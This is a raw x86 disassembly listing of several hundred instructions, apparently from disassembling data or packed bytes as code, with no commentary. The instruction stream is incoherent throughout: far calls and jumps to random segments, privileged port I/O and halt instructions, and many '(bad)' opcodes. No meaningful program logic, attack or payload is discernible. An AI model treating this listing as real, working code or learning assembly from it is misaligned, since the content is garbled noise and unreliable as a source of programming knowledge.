  416612:	mov    ds:0xe010f2fb,al
  416617:	retf   0xe2f7
  41661a:	or     eax,0x6cd9efaf
  41661f:	sbb    ebx,ecx
  416621:	nop
  416622:	inc    ecx
  416623:	icebp  
  416624:	and    DWORD PTR [eax-0x68217c79],ebp
  41662a:	inc    edx
  41662b:	shl    DWORD PTR [edx+0x3f],0xd6
  41662f:	sbb    BYTE PTR [esi-0x3b],al
  416632:	out    0x66,al
  416634:	cmp    BYTE PTR [esp+ebp*8+0x1c],0x7e
  416639:	dec    ebx
  41663a:	fwait
  41663b:	xchg   DWORD PTR [edi+0x54],edx
  41663e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41663f:	not    edx
  416641:	sbb    eax,0x8660bd0b
  416646:	add    edi,DWORD PTR [ebp+0x6f67df9f]
  41664c:	add    dl,BYTE PTR [esi-0x34]
  41664f:	xchg   esp,eax
  416650:	pusha  
  416651:	adc    BYTE PTR [esi-0x4f3b0f8],cl
  416657:	push   eax
  416658:	aad    0x1e
  41665a:	cmc    
  41665b:	pop    esi
  41665c:	pop    esp
  41665d:	pop    es
  41665e:	rol    DWORD PTR [esi+eiz*4-0x4186ccad],0x26
  416666:	lods   al,BYTE PTR ds:[esi]
  416667:	hlt    
  416668:	or     al,0x6c
  41666a:	dec    eax
  41666b:	scas   eax,DWORD PTR es:[edi]
  41666c:	ins    DWORD PTR es:[edi],dx
  41666d:	(bad)  [ecx+0x7e]
  416670:	push   es
  416671:	sbb    DWORD PTR [ebx],edi
  416673:	lea    eax,[esp+ebx*4]
  416676:	inc    eax
  416677:	xor    BYTE PTR [esi],dl
  416679:	mov    ah,0xbb
  41667b:	mov    bl,0x15
  41667d:	cmp    dh,bl
  41667f:	out    dx,al
  416680:	fsubr  DWORD PTR [esi]
  416682:	hlt    
  416683:	and    ah,BYTE PTR [ebp+0x2c]
  416686:	rcr    DWORD PTR [esi],0x34
  416689:	cmc    
  41668a:	push   ecx
  41668b:	loopne 0x416658
  41668d:	js     0x4166e8
  41668f:	jbe    0x4166f1
  416691:	mov    dl,0x44
  416693:	dec    edx
  416694:	sub    DWORD PTR [edx-0x47],ecx
  416697:	mov    ebp,gs
  416699:	push   esp
  41669a:	xor    dh,dl
  41669c:	pop    esp
  41669d:	ins    DWORD PTR es:[edi],dx
  41669e:	into   
  41669f:	dec    eax
  4166a0:	xor    BYTE PTR ds:0x6a22c019,bl
  4166a6:	cmp    BYTE PTR [edx],0x63
  4166a9:	inc    ebp
  4166aa:	pxor   mm5,QWORD PTR [ebx-0x3b4a894b]
  4166b1:	scas   al,BYTE PTR es:[edi]
  4166b2:	int3   
  4166b3:	dec    esi
  4166b4:	in     al,dx
  4166b5:	aad    0xc4
  4166b7:	ret    
  4166b8:	fs mov cl,0x35
  4166bb:	mov    esp,0x56e139b1
  4166c0:	jecxz  0x4166f2
  4166c2:	nop
  4166c3:	pop    ss
  4166c4:	enter  0x9d88,0xe1
  4166c8:	mov    ds:0xc45d3d7a,eax
  4166cd:	in     eax,0xb6
  4166cf:	(bad)  [ebx-0x3efe95f2]
  4166d5:	xchg   ebp,eax
  4166d6:	stos   BYTE PTR es:[edi],al
  4166d7:	jno    0x41674a
  4166d9:	inc    edx
  4166da:	scas   eax,DWORD PTR es:[edi]
  4166db:	cld    
  4166dc:	mov    ecx,0xacb583fc
  4166e1:	adc    dl,dh
  4166e3:	push   ds
  4166e4:	pop    esp
  4166e5:	popf   
  4166e6:	lock pop edi
  4166e8:	jo     0x41668d
  4166ea:	pop    ebp
  4166eb:	gs push ecx
  4166ed:	popa   
  4166ee:	fs test cl,ch
  4166f1:	push   esp
  4166f2:	je     0x4166e0
  4166f4:	scas   al,BYTE PTR es:[edi]
  4166f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166f6:	mov    eax,ds:0xb3c20203
  4166fb:	out    0xd8,eax
  4166fd:	add    BYTE PTR [edi],0x7e
  416700:	mov    bl,0x2e
  416702:	ret    
  416703:	mov    esp,0xf496a26e
  416708:	xor    al,0x84
  41670a:	push   ebx
  41670b:	mov    ebx,0x132eb49d
  416710:	xchg   ecx,eax
  416711:	sub    DWORD PTR [ecx+0x162c07c6],0x48
  416718:	xchg   ebp,eax
  416719:	nop
  41671a:	or     dh,BYTE PTR [edx+eiz*8+0x1f]
  41671e:	sub    al,0x76
  416720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416721:	xlat   BYTE PTR ds:[ebx]
  416722:	sbb    bh,BYTE PTR [eax+0x3e]
  416725:	rcr    DWORD PTR [ebx-0x774a3bc7],cl
  41672b:	mov    dl,0xb4
  41672d:	push   edx
  41672e:	mov    eax,ds:0xc6d6a9cd
  416733:	xchg   esi,eax
  416734:	add    esi,DWORD PTR [esi-0x2d]
  416737:	js     0x4167a5
  416739:	shl    BYTE PTR [ebx+ebp*8],0x45
  41673d:	dec    esp
  41673e:	sbb    cl,BYTE PTR [ebp-0x60f20dd6]
  416744:	jge    0x4166e1
  416746:	int3   
  416747:	dec    esi
  416748:	push   ecx
  416749:	cmp    bh,ch
  41674b:	push   esi
  41674c:	jge    0x4166ee
  41674e:	mov    bl,0xfa
  416750:	pusha  
  416751:	push   cs
  416752:	(bad)  
  416754:	ins    DWORD PTR es:[edi],dx
  416755:	adc    dl,BYTE PTR [ecx]
  416757:	cmc    
  416758:	mov    ds:0xd9359811,al
  41675d:	lods   al,BYTE PTR ds:[esi]
  41675e:	adc    eax,0x5a8b3446
  416763:	adc    ah,bl
  416765:	fisub  DWORD PTR [ecx+0x42d8f282]
  41676b:	stc    
  41676c:	shr    DWORD PTR [ecx+ebx*1-0x4953c761],1
  416773:	or     DWORD PTR [ebx-0x5],0x46
  416777:	xchg   ebp,eax
  416778:	in     al,dx
  416779:	shl    ebx,0x32
  41677c:	idiv   ebp
  41677e:	rcr    BYTE PTR [esi+0x1b],1
  416781:	sahf   
  416782:	xor    edx,DWORD PTR [edx-0x50]
  416785:	adc    DWORD PTR [edx],edx
  416787:	cdq    
  416788:	cmp    al,0xcb
  41678a:	jle    0x4167dd
  41678c:	stos   BYTE PTR es:[edi],al
  41678d:	pop    ss
  41678e:	icebp  
  41678f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416790:	sub    dh,dh
  416792:	or     DWORD PTR [edx-0x77],esi
  416795:	push   ds
  416796:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  416798:	nop
  416799:	inc    ebx
  41679a:	pop    ebp
  41679b:	test   eax,0x82030068
  4167a0:	call   0xe213:0xcb069e45
  4167a7:	repz mov dl,0x81
  4167aa:	loop   0x416748
  4167ac:	adc    al,0x3a
  4167ae:	inc    ebp
  4167af:	push   ds
  4167b0:	imul   ecx,DWORD PTR [edi+ebp*4-0x5b],0xffffffbe
  4167b5:	pop    edi
  4167b6:	addr16 in al,0xde
  4167b9:	(bad)  
  4167ba:	repz add ch,BYTE PTR [edi+0x3]
  4167be:	and    al,0xaa
  4167c0:	cmp    esi,esp
  4167c2:	add    BYTE PTR [ecx+0x6],bh
  4167c5:	arpl   dx,bx
  4167c7:	sbb    esi,DWORD PTR [ebx-0x12]
  4167ca:	adc    DWORD PTR [ebx],ebx
  4167cc:	push   ecx
  4167cd:	push   ecx
  4167ce:	leave  
  4167cf:	xor    BYTE PTR [ebp+0x3d],bh
  4167d2:	ret    
  4167d3:	mov    esi,0x6bd6b343
  4167d8:	cmp    bh,BYTE PTR [ebx+edx*2-0x76bf40c0]
  4167df:	inc    esi
  4167e0:	cmc    
  4167e1:	js     0x416780
  4167e3:	inc    BYTE PTR [eax]
  4167e5:	dec    ebp
  4167e6:	jl     0x416865
  4167e8:	sbb    BYTE PTR [edx+0x50],dh
  4167eb:	pop    ss
  4167ec:	dec    esp
  4167ed:	adc    edx,ebx
  4167ef:	(bad)  [esi]
  4167f1:	(bad)  
  4167f2:	out    0xf8,eax
  4167f4:	not    DWORD PTR [ebx+0x26]
  4167f7:	dec    ecx
  4167f8:	dec    esi
  4167f9:	stos   BYTE PTR es:[edi],al
  4167fa:	into   
  4167fb:	jo     0x4167f0
  4167fd:	pop    eax
  4167fe:	mov    bh,0x2f
  416800:	cmp    BYTE PTR [ebx-0x13],0x9a
  416804:	mov    ah,0x20
  416806:	fimul  DWORD PTR [ecx+0x6d]
  416809:	or     DWORD PTR [ebx+edx*2+0x12b0eb1a],edi
  416810:	repnz stc 
  416812:	pop    es
  416813:	repnz (bad)
  416816:	dec    ebx
  416817:	loope  0x41684f
  416819:	daa    
  41681a:	and    esi,esi
  41681c:	add    al,0x8a
  41681e:	stos   BYTE PTR es:[edi],al
  41681f:	loope  0x4167ae
  416821:	mov    cl,0xcd
  416823:	inc    esp
  416824:	outs   dx,DWORD PTR ds:[esi]
  416825:	hlt    
  416826:	ret    
  416827:	std    
  416828:	jnp    0x416810
  41682a:	fstp   QWORD PTR ds:0x10946dc9
  416830:	adc    BYTE PTR [esi],dl
  416832:	call   0x6eb3:0xe075d0e7
  416839:	popa   
  41683a:	mov    eax,ds:0x2d53d1cf
  41683f:	push   ds
  416840:	mov    edi,0x7d117bab
  416845:	in     eax,0x5b
  416847:	daa    
  416848:	mov    ah,BYTE PTR [edi+esi*2-0x478eea95]
  41684f:	outs   dx,BYTE PTR ss:[esi]
  416851:	mov    bh,0xc7
  416853:	ins    BYTE PTR es:[edi],dx
  416854:	rcl    DWORD PTR ds:0xd835c554,0xa9
  41685b:	xlat   BYTE PTR ds:[ebx]
  41685c:	push   ebp
  41685d:	mov    ch,0xd2
  41685f:	fs jnp 0x4167e7
  416862:	out    dx,al
  416863:	ins    DWORD PTR es:[edi],dx
  416864:	and    DWORD PTR [edi-0x39],edi
  416867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416868:	iret   
  416869:	and    BYTE PTR ds:0x1afd97d3,ch
  41686f:	fld    QWORD PTR [edi]
  416871:	in     al,0xd4
  416873:	mov    al,0x4f
  416875:	add    DWORD PTR [eax+0x73906ed8],edx
  41687b:	hlt    
  41687c:	mov    bl,BYTE PTR [ebp-0x6f]
  41687f:	lahf   
  416880:	fsub   DWORD PTR [edi+0xd]
  416883:	xor    ebx,DWORD PTR [edx]
  416885:	inc    ebx
  416886:	in     al,dx
  416887:	xchg   edi,eax
  416888:	popa   
  416889:	cli    
  41688a:	dec    esi
  41688b:	jg     0x41680e
  41688d:	adc    al,0xd0
  41688f:	mov    BYTE PTR [ebp-0x2d],dl
  416892:	xlat   BYTE PTR ds:[ebx]
  416893:	mov    edx,DWORD PTR [edx]
  416895:	jge    0x416846
  416897:	pop    ss
  416898:	and    dh,bh
  41689a:	ja     0x4168cd
  41689c:	cmp    al,0x51
  41689e:	data16 fld TBYTE PTR [edx+0x17]
  4168a2:	sar    DWORD PTR [eax+edx*1+0x34],1
  4168a6:	sbb    al,0xb1
  4168a8:	sbb    esi,DWORD PTR [esi+ebp*2-0x47]
  4168ac:	mov    DWORD PTR [esi],eax
  4168ae:	xor    BYTE PTR [edi-0x59],al
  4168b1:	xor    dl,ah
  4168b3:	fwait
  4168b4:	test   eax,0x6d6ecd9b
  4168b9:	cmp    ebp,DWORD PTR [edi+0x9469a66]
  4168bf:	aaa    
  4168c0:	data16 in al,0x6f
  4168c3:	in     eax,0x5f
  4168c5:	into   
  4168c6:	sar    BYTE PTR [ecx-0xe],1
  4168c9:	inc    ecx
  4168ca:	xchg   esi,eax
  4168cb:	mov    DWORD PTR [edx+0xdbdc29],ecx
  4168d1:	jmp    0xf97a:0x21ae94e1
  4168d8:	or     eax,0xcaf2a733
  4168dd:	jno    0x416868
  4168df:	push   ecx
  4168e0:	jl     0x416946
  4168e2:	xchg   ebp,eax
  4168e3:	call   0xd8d21c75
  4168e8:	xchg   ebx,eax
  4168e9:	js     0x41686d
  4168eb:	mov    ecx,0x2939ee25
  4168f0:	fwait
  4168f1:	push   ss
  4168f2:	push   ecx
  4168f3:	ins    DWORD PTR es:[edi],dx
  4168f4:	jmp    0xd032:0x14b8b47d
  4168fb:	mov    al,ds:0x34d5794b
  416900:	push   edi
  416901:	pop    ebx
  416902:	adc    cl,BYTE PTR [ecx-0x34]
  416905:	push   ebx
  416906:	ins    BYTE PTR es:[edi],dx
  416907:	pop    edi
  416908:	sbb    eax,DWORD PTR [edi-0x18]
  41690b:	and    esi,esi
  41690d:	sbb    eax,0x9f42d5b6
  416912:	es sbb eax,0x38dab582
  416918:	sub    eax,0x9f0c7139
  41691d:	adc    DWORD PTR [edi],ecx
  41691f:	cmp    al,0xd2
  416921:	aas    
  416922:	jl     0x41693c
  416924:	push   edi
  416925:	mov    dl,0x70
  416927:	and    BYTE PTR [ecx+0x398255cc],bh
  41692d:	out    0x81,eax
  41692f:	lods   eax,DWORD PTR ds:[esi]
  416930:	mov    ebx,0xbdea8b79
  416935:	xchg   edi,eax
  416936:	adc    eax,0x34b25f7a
  41693b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41693c:	jo     0x4168d1
  41693e:	xchg   esi,eax
  41693f:	std    
  416940:	mov    ecx,ss
  416942:	jae    0x416962
  416944:	leave  
  416945:	imul   eax,DWORD PTR [eax+ebx*2],0xfffffffc
  416949:	dec    esp
  41694a:	popf   
  41694b:	cmp    esi,ecx
  41694d:	lods   eax,DWORD PTR ds:[esi]
  41694e:	mov    al,ds:0xffc24603
  416953:	mov    es,WORD PTR [ecx+0x532881f1]
  416959:	inc    esp
  41695a:	mov    ?,WORD PTR [ebp-0xb]
  41695d:	not    dh
  41695f:	ja     0x4169a2
  416961:	sbb    DWORD PTR [edx-0x46],eax
  416964:	jl     0x4169a7
  416966:	mov    eax,0x8531dec4
  41696b:	into   
  41696c:	mov    WORD PTR [esi],ss
  41696e:	fist   DWORD PTR [ebp+0x5fd03f41]
  416974:	(bad)  
  416975:	sbb    DWORD PTR [ebx],edi
  416977:	mov    ds:0xccdcd5e2,eax
  41697c:	jle    0x4169e4
  41697e:	or     edx,DWORD PTR [edi]
  416980:	lea    esi,[ecx+0x6b4104b9]
  416986:	scas   al,BYTE PTR es:[edi]
  416987:	outs   dx,BYTE PTR ds:[esi]
  416988:	(bad)  
  416989:	cmp    al,0x37
  41698b:	loopne 0x416930
  41698d:	or     ah,al
  41698f:	inc    esp
  416990:	dec    ecx
  416991:	adc    BYTE PTR [ebx],bh
  416993:	jecxz  0x41696e
  416995:	loop   0x4169fb
  416997:	test   BYTE PTR [edi],ah
  416999:	repnz fsub DWORD PTR [esp+edx*2]
  41699d:	pop    ebx
  41699e:	aas    
  41699f:	int    0x99
  4169a1:	add    eax,0x1b04505e
  4169a6:	dec    ebp
  4169a7:	vmpsadbw xmm0,xmm5,XMMWORD PTR es:[edi+ebx*4+0x17],0x47
  4169b0:	or     BYTE PTR [ebx],bh
  4169b2:	push   ds
  4169b3:	and    al,0x5b
  4169b5:	dec    esi
  4169b6:	xchg   edi,eax
  4169b7:	test   BYTE PTR [ebp+0x214f9886],dl
  4169bd:	xchg   edi,eax
  4169be:	ins    DWORD PTR es:[edi],dx
  4169bf:	int    0x25
  4169c1:	imul   eax,DWORD PTR [ebx+0x40],0xffffffea
  4169c5:	mov    bh,0xf8
  4169c7:	dec    eax
  4169c8:	outs   dx,DWORD PTR ds:[esi]
  4169c9:	lods   al,BYTE PTR ds:[esi]
  4169ca:	in     al,dx
  4169cb:	xor    al,0xc2
  4169cd:	dec    ebp
  4169ce:	push   ebp
  4169cf:	inc    eax
  4169d0:	dec    eax
  4169d1:	jge    0x416a2f
  4169d3:	sti    
  4169d4:	test   eax,0x4fcc3d1b
  4169d9:	dec    esi
  4169da:	push   es
  4169db:	xchg   DWORD PTR [edx-0x60a862e4],edx
  4169e1:	into   
  4169e2:	stos   DWORD PTR es:[edi],eax
  4169e3:	dec    esi
  4169e4:	push   edi
  4169e5:	loop   0x416969
  4169e7:	(bad)  
  4169e8:	xchg   ebp,eax
  4169e9:	dec    edi
  4169ea:	dec    edx
  4169eb:	leave  
  4169ec:	xor    ah,ah
  4169ee:	test   BYTE PTR [eax+0x7b],ch
  4169f1:	enter  0x4176,0x67
  4169f5:	push   0x679b273d
  4169fa:	(bad)  
  4169fb:	sbb    eax,DWORD PTR [esi+0x2a5a0138]
  416a01:	out    0xbd,al
  416a03:	enter  0xc074,0xed
  416a07:	mov    ebp,0x5962c380
  416a0c:	mov    edx,0x487e44d4
  416a11:	sbb    ebp,DWORD PTR [ecx]
  416a13:	pop    ebx
  416a14:	rcr    BYTE PTR [eax],0xdd
  416a17:	pop    edx
  416a18:	shr    DWORD PTR [ebp+0xac4b32c],cl
  416a1e:	stos   DWORD PTR es:[edi],eax
  416a1f:	stos   DWORD PTR es:[edi],eax
  416a20:	leave  
  416a21:	stc    
  416a22:	iret   
  416a23:	shl    ebx,cl
  416a25:	sub    DWORD PTR [esi],0x6b
  416a28:	ret    
  416a29:	aaa    
  416a2a:	jo     0x4169c3
  416a2c:	mov    edx,0x729713f6
  416a31:	pop    ds
  416a32:	and    BYTE PTR [ecx+0x5e],cl
  416a35:	xchg   edi,eax
  416a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a38:	and    BYTE PTR [esi+ecx*8+0x6f3338eb],al
  416a3f:	push   ecx
  416a40:	int    0x4b
  416a42:	cmp    BYTE PTR [ecx+0x573c2b6d],dh
  416a48:	jmp    0x416ac4
  416a4a:	mov    bh,0x6d
  416a4c:	cmp    ch,BYTE PTR [ecx]
  416a4e:	int3   
  416a4f:	cld    
  416a50:	repz jmp 0xdd87:0xe8b2a902
  416a58:	call   0xbdb0:0xde9d2b16
  416a5f:	jecxz  0x416a7a
  416a61:	xchg   esi,eax
  416a62:	adc    DWORD PTR [edx],0xe
  416a65:	in     eax,dx
  416a66:	pop    ecx
  416a67:	repnz lahf 
  416a69:	sti    
  416a6a:	adc    BYTE PTR [eax],ah
  416a6c:	clc    
  416a6d:	adc    edi,DWORD PTR [edx]
  416a6f:	stos   BYTE PTR es:[edi],al
  416a70:	in     eax,0x1d
  416a72:	fcom   DWORD PTR [eax+0x4f]
  416a75:	adc    BYTE PTR [edi-0x7f733b1f],dl
  416a7b:	call   0xdad5:0xcc748de5
  416a82:	scas   eax,DWORD PTR es:[edi]
  416a83:	enter  0x4de0,0x4b
  416a87:	cli    
  416a88:	js     0x416a1f
  416a8a:	or     esi,edx
  416a8c:	dec    eax
  416a8d:	scas   al,BYTE PTR es:[edi]
  416a8e:	jmp    0xc52218ca
  416a93:	push   cs
  416a94:	test   al,0x7
  416a96:	xchg   esp,eax
  416a97:	test   ch,bh
  416a99:	and    BYTE PTR [ecx+0x1f],0x24
  416a9d:	mov    edx,0x502694f0
  416aa2:	idiv   ecx
  416aa4:	sub    BYTE PTR [esi-0x29],0xa6
  416aa8:	mov    ds:0x96bc3ea0,eax
  416aad:	adc    al,0xbf
  416aaf:	adc    DWORD PTR [eax+0x78],0x34474841
  416ab6:	(bad)  
  416ab7:	mov    al,ds:0xef3fdd16
  416abc:	pop    esi
  416abd:	xchg   ebx,eax
  416abe:	sahf   
  416abf:	inc    esp
  416ac0:	idiv   ch
  416ac2:	mov    ebp,0x209d51f3
  416ac7:	xor    al,0x60
  416ac9:	call   0x573b:0x375ae9f1
  416ad0:	cmp    al,0x40
  416ad2:	in     eax,dx
  416ad3:	or     DWORD PTR [eax+0x11],edi
  416ad6:	(bad)  
  416ad7:	pop    edi
  416ad8:	mov    bh,0xc1
  416ada:	jge    0x416a67
  416adc:	dec    ebp
  416add:	mov    BYTE PTR [edi+0x4e],0x97
  416ae1:	das    
  416ae2:	push   ss
  416ae3:	repnz dec ecx
  416ae5:	test   BYTE PTR [edi],bh
  416ae7:	ins    DWORD PTR es:[edi],dx
  416ae8:	mov    ecx,0xa77c6be2
  416aed:	lods   eax,DWORD PTR ds:[esi]
  416aee:	outs   dx,DWORD PTR ds:[esi]
  416aef:	pop    es
  416af0:	or     BYTE PTR [edi],bh
  416af2:	shl    DWORD PTR [edx],1
  416af4:	mov    al,ds:0x1a855534
  416af9:	jecxz  0x416b38
  416afb:	loop   0x416ae8
  416afd:	(bad)  
  416afe:	pop    esp
  416aff:	lods   eax,DWORD PTR ds:[esi]
  416b00:	data16 mov ah,0x3d
  416b03:	cmc    
  416b04:	out    dx,al
  416b05:	cmp    eax,0x3552a509
  416b0a:	mov    al,ds:0xd31bb52d
  416b0f:	push   esp
  416b10:	js     0x416b68
  416b12:	bound  ebp,QWORD PTR [eax+ecx*1-0x2d]
  416b16:	or     ebp,esi
  416b18:	scas   eax,DWORD PTR es:[edi]
  416b19:	out    dx,al
  416b1a:	mov    dl,0xd1
  416b1c:	ss fwait
  416b1e:	(bad)  
  416b1f:	les    edx,FWORD PTR [edi]
  416b21:	and    ecx,edx
  416b23:	xchg   ebx,eax
  416b24:	mov    ds:0xfd6774bc,eax
  416b29:	jge    0x416aad
  416b2b:	jnp    0x416b24
  416b2d:	mov    eax,ds:0x59c8eb4
  416b32:	into   
  416b33:	cwde   
  416b34:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b36:	sub    BYTE PTR [ebx],dl
  416b38:	add    cl,BYTE PTR [edx+0x878e6f1]
  416b3e:	dec    edi
  416b3f:	retf   
  416b40:	fldcw  WORD PTR ds:0x61d244de
  416b46:	add    DWORD PTR [edi],ebp
  416b48:	xor    BYTE PTR [ebp+0x64],ah
  416b4b:	pop    ss
  416b4c:	add    DWORD PTR [edx-0x17],esp
  416b4f:	loop   0x416b06
  416b51:	das    
  416b52:	pop    esp
  416b53:	retf   
  416b54:	adc    esp,DWORD PTR fs:[edi+0x744efcee]
  416b5b:	ret    
  416b5c:	add    ch,BYTE PTR [ebp+0x3a84dcd8]
  416b62:	out    dx,eax
  416b63:	lea    ebp,[edx]
  416b65:	imul   ebx,DWORD PTR [esi-0x35c1f218],0x4c3f0442
  416b6f:	daa    
  416b70:	sub    al,BYTE PTR [ecx+0x9]
  416b73:	aam    0x8
  416b75:	(bad)  
  416b76:	ror    BYTE PTR [ebx-0x6d],0x2a
  416b7a:	mov    ebx,0xa63eb3b9
  416b7f:	lahf   
  416b80:	lds    ecx,FWORD PTR [edi+0x60]
  416b83:	and    BYTE PTR [edx],0xec
  416b86:	std    
  416b87:	mov    bh,0x4e
  416b89:	imul   edx,esp,0xffffff89
  416b8c:	xchg   ebx,eax
  416b8d:	lods   al,BYTE PTR ds:[esi]
  416b8e:	pop    esp
  416b8f:	outs   dx,DWORD PTR ds:[esi]
  416b90:	pop    esp
  416b91:	adc    bh,dh
  416b93:	imul   edx,DWORD PTR [edx],0xf31e6214
  416b99:	adc    cl,cl
  416b9b:	pop    ebp
  416b9c:	imul   esi,eax,0x1f
  416b9f:	mov    ds:0x8b934ac,eax
  416ba4:	pushf  
  416ba5:	mov    bh,dl
  416ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ba8:	jo     0x416bc9
  416baa:	outs   dx,BYTE PTR ds:[esi]
  416bab:	push   ebp
  416bac:	sbb    al,0x7e
  416bae:	cmp    cl,BYTE PTR [eax+eax*4-0x60fe1718]
  416bb5:	jp     0x416bd7
  416bb7:	add    DWORD PTR cs:[ebx+0xe04cece],edx
  416bbe:	in     eax,dx
  416bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bc0:	pop    ebp
  416bc1:	and    al,BYTE PTR [esi+0x65264881]
  416bc7:	imul   DWORD PTR ds:0x20be2823
  416bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bce:	cmp    DWORD PTR [esi],ebx
  416bd0:	mov    ds:0xbfb569b7,eax
  416bd5:	pop    ss
  416bd6:	cs mov ebx,0x4dca28c3
  416bdc:	fdiv   DWORD PTR ds:0xcf2180ee
  416be2:	xchg   DWORD PTR [ebx],ebp
  416be4:	ins    BYTE PTR es:[edi],dx
  416be5:	xor    edi,edx
  416be7:	idiv   edi
  416be9:	mov    ds:0xb181bb46,al
  416bee:	out    0x31,eax
  416bf0:	pop    es
  416bf1:	and    eax,0x85040e2f
  416bf6:	stos   DWORD PTR es:[edi],eax
  416bf7:	mov    BYTE PTR [edx+edi*2+0x4],dl
  416bfb:	lock push ss
  416bfd:	xor    eax,0x636f82ac
  416c02:	mov    DWORD PTR [edi+0x6f],ebp
  416c05:	pop    ebx
  416c06:	imul   ebp,DWORD PTR [edx],0xffffffe3
  416c09:	or     al,0xb9
  416c0b:	add    DWORD PTR [edi+0x34],edx
  416c0e:	jp     0x416c3f
  416c10:	xchg   ebp,eax
  416c11:	sbb    edx,esi
  416c13:	cs pop ebx
  416c15:	jnp    0x416bd0
  416c17:	scas   al,BYTE PTR es:[edi]
  416c18:	xchg   edi,eax
  416c19:	lds    esp,FWORD PTR [ebp-0x14]
  416c1c:	cmp    DWORD PTR [edi-0x461d43b4],edi
  416c22:	sti    
  416c23:	lds    ebp,FWORD PTR [edx+ecx*4]
  416c26:	cmp    BYTE PTR [edx+0x5a13ee98],bh
  416c2c:	int    0xf1
  416c2e:	cmp    al,0x35
  416c30:	ror    DWORD PTR fs:[eax-0x63ae1e38],1
  416c37:	pushf  
  416c38:	ins    BYTE PTR es:[edi],dx
  416c39:	shl    DWORD PTR [ebx+0x5f129fc6],cl
  416c3f:	push   cs
  416c40:	(bad)  
  416c41:	mul    esi
  416c43:	or     dh,ah
  416c45:	stos   BYTE PTR es:[edi],al
  416c46:	ins    BYTE PTR es:[edi],dx
  416c47:	xor    al,0x9e
  416c49:	xchg   DWORD PTR [ebp-0x4],edx
  416c4c:	scas   eax,DWORD PTR es:[edi]
  416c4d:	inc    edi
  416c4e:	mov    edi,0x769d9367
  416c53:	sub    eax,0xf6c433e2
  416c58:	mov    al,0x12
  416c5a:	into   
  416c5b:	push   esi
  416c5c:	int    0x26
  416c5e:	lahf   
  416c5f:	dec    ebx
  416c60:	rcl    BYTE PTR ds:0x3c50ec50,cl
  416c66:	inc    esi
  416c67:	xchg   BYTE PTR [edx],ah
  416c69:	or     dl,dh
  416c6b:	push   ds
  416c6c:	add    ah,bl
  416c6e:	pop    edx
  416c6f:	test   al,0xb1
  416c71:	shr    DWORD PTR [ebx+edi*4],cl
  416c74:	mov    esp,0x79cefff5
  416c79:	jg     0x416cae
  416c7b:	into   
  416c7c:	jne    0x416c1f
  416c7e:	pop    ebp
  416c7f:	ror    BYTE PTR [edx+0x2018c934],1
  416c85:	push   esp
  416c86:	sti    
  416c87:	(bad)  
  416c88:	hlt    
  416c89:	cs mov ebp,0xe01010fc
  416c8f:	push   ecx
  416c90:	(bad)  
  416c91:	hlt    
  416c92:	(bad)  
  416c93:	stos   DWORD PTR es:[edi],eax
  416c94:	fsub   DWORD PTR [ebx-0x1694bb68]
  416c9a:	jne    0x416c33
  416c9c:	push   eax
  416c9d:	outs   dx,BYTE PTR ds:[esi]
  416c9e:	mov    bh,0xfc
  416ca0:	jge    0x416c95
  416ca2:	cmp    BYTE PTR [esi-0x27c9f67f],al
  416ca8:	test   eax,ebx
  416caa:	shr    DWORD PTR [ecx],1
  416cac:	push   ss
  416cad:	adc    al,0xb3
  416caf:	pop    ebp
  416cb0:	cmp    cl,BYTE PTR [ebx]
  416cb2:	mov    al,ds:0xc74d5dd5
  416cb8:	cmp    DWORD PTR [edi],edi
  416cba:	gs jo  0x416cd9
  416cbd:	pusha  
  416cbe:	add    al,bl
  416cc0:	aaa    
  416cc1:	ja     0x416d33
  416cc3:	mov    ch,0x19
  416cc5:	sar    DWORD PTR [ecx],cl
  416cc7:	or     dl,BYTE PTR [ebx-0x67]
  416cca:	and    ecx,DWORD PTR [ecx-0x73]
  416ccd:	cmp    DWORD PTR [edx],edx
  416ccf:	mov    edx,0xbcadb5bd
  416cd4:	ja     0x416cab
  416cd6:	xor    al,dh
  416cd8:	dec    ebp
  416cd9:	inc    eax
  416cda:	icebp  
  416cdb:	fidiv  DWORD PTR [esi-0x4693b88a]
  416ce1:	cli    
  416ce2:	outs   dx,DWORD PTR ds:[esi]
  416ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ce4:	ficomp DWORD PTR [ebx-0x9]
  416ce7:	lea    edx,[eax+0x8]
  416cea:	mov    ah,0x1c
  416cec:	dec    ebp
  416ced:	mov    DWORD PTR [edx+edi*1],edi
  416cf0:	adc    eax,0x54affeec
  416cf5:	lds    edi,FWORD PTR [ecx-0x4a5600ab]
  416cfb:	and    BYTE PTR [eax],dl
  416cfd:	inc    ebx
  416cfe:	dec    eax
  416cff:	icebp  
  416d00:	mov    edi,0x44e0c45b
  416d05:	mov    al,ds:0x3c506f2c
  416d0a:	stos   DWORD PTR es:[edi],eax
  416d0b:	or     eax,0x2c48e2eb
  416d10:	push   edi
  416d11:	cld    
  416d12:	and    DWORD PTR [edi],esi
  416d14:	mov    al,0xbe
  416d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d17:	add    BYTE PTR [esi+0x58],bl
  416d1a:	jns    0x416d1b
  416d1c:	rol    ebp,cl
  416d1e:	retf   0x17c2
  416d21:	mul    ebp
  416d23:	(bad)  
  416d24:	shl    DWORD PTR [eax],1
  416d26:	lahf   
  416d27:	jl     0x416d6d
  416d29:	and    cl,BYTE PTR ds:[esi]
  416d2c:	cli    
  416d2d:	(bad)  
  416d2e:	das    
  416d2f:	pop    ebp
  416d30:	retf   
  416d31:	adc    al,0x7d
  416d33:	shr    BYTE PTR [edx],1
  416d35:	or     eax,0xae2e680a
  416d3a:	fwait
  416d3b:	pop    ds
  416d3c:	inc    eax
  416d3d:	mov    ch,0xc8
  416d3f:	cwde   
  416d40:	(bad)  
  416d41:	xor    DWORD PTR [edx-0x1966abf4],esp
